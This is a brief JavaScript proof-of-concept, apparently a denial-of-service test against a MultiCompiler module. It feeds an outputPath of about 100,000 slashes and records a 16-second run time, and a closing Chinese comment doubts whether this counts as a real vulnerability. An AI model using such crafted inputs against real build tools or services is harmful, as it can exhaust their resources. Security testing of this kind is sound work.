const MultiCompiler = require("./MultiCompiler.js");

//Attack String :""+"/"*100000+"/"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "/";
}
str += "/";

const compiler1 = {
  outputPath: "\\" + str,
};
const compiler2 = {
  outputPath: str,
};
var myObj = new MultiCompiler([compiler1, compiler2], "");
var result = myObj.outputPath;

// real    0m16.194s
// user    0m16.152s
// sys     0m0.040s

//不知是否算成功,因为时间长是因为while循环的次数很多
